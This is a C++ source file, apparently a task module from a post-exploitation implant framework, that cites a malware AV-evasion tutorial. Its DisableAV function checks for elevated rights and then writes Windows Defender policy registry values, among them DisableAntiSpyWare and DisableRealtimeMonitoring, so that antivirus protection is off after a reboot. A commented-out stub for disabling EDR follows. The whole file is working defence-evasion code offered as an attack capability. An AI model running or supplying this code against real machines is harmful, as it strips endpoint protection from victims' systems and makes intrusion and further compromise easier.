#include "core/task.hpp"

namespace Task
{
    // Disable AV.
    // Reference: https://cocomelonc.github.io/tutorial/2022/06/05/malware-av-evasion-7.html
    std::wstring DisableAV(State::PSTATE pState)
    {
        // Check for admin rights.
        HANDLE hToken = System::Process::ProcessTokenOpen(pState->pProcs, NtCurrentProcess(), TOKEN_QUERY);
        if (!hToken)
        {
            return L"Error: Failed to open process token.";
        }

        TOKEN_ELEVATION tokenElev;
        DWORD dwSize;
        if (!pState->pProcs->lpGetTokenInformation(hToken, TokenElevation, &tokenElev, sizeof(tokenElev), &dwSize))
        {
            System::Handle::HandleClose(pState->pProcs, hToken);
            return L"Error: Failed to get token information.";
        }
        if (!tokenElev.TokenIsElevated)
        {
            System::Handle::HandleClose(pState->pProcs, hToken);
            return L"Error: You don't have administrator rights.";
        }
        System::Handle::HandleClose(pState->pProcs, hToken);

        // Edit registry to disable AV.
        HKEY hKey;
        HKEY hNewKey;
        DWORD dwDisable = 1;

        LONG res = pState->pProcs->lpRegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
            0,
            KEY_ALL_ACCESS,
            &hKey
        );
        if (res != ERROR_SUCCESS)
        {
            return L"Error: Failed to open registry key.";
        }

        pState->pProcs->lpRegSetValueExW(
            hKey,
            L"DisableAntiSpyWare",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );

        pState->pProcs->lpRegCreateKeyExW(
            hKey,
            L"Real-Time Protection",
            0,
            0,
            REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS,
            0,
            &hNewKey,
            0
        );

        pState->pProcs->lpRegSetValueExW(
            hNewKey,
            L"DisableRealtimeMonitoring",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );
        pState->pProcs->lpRegSetValueExW(
            hNewKey,
            L"DisableBehaviorMonitoring",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );
        pState->pProcs->lpRegSetValueExW(
            hNewKey,
            L"DisableScanOnRealtimeEnable",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );
        pState->pProcs->lpRegSetValueExW(
            hNewKey,
            L"DisableOnAccessProtection",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );
        pState->pProcs->lpRegSetValueExW(
            hNewKey,
            L"DisableIOAVProtection",
            0,
            REG_DWORD,
            (const BYTE*)&dwDisable,
            sizeof(dwDisable)
        );

        pState->pProcs->lpRegCloseKey(hKey);
        pState->pProcs->lpRegCloseKey(hNewKey);

        return L"Success: Completed setting the registry to disable AV. When the machine restarted, Windows Defender is disabled.";
    }

    // Disable EDR.
    // std::wstring DisableEDR(State::PSTATE pState)
    // {
    //     return L"Warning: This is not implemented yet.";
    // }
}